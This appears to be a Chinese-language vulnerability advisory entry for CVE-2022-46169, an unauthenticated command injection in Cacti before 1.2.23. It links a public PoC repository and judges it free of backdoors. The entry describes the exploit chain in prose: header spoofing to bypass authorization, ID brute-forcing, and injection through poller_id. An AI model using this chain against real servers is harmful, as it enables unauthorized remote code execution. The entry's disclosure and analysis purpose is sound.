**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

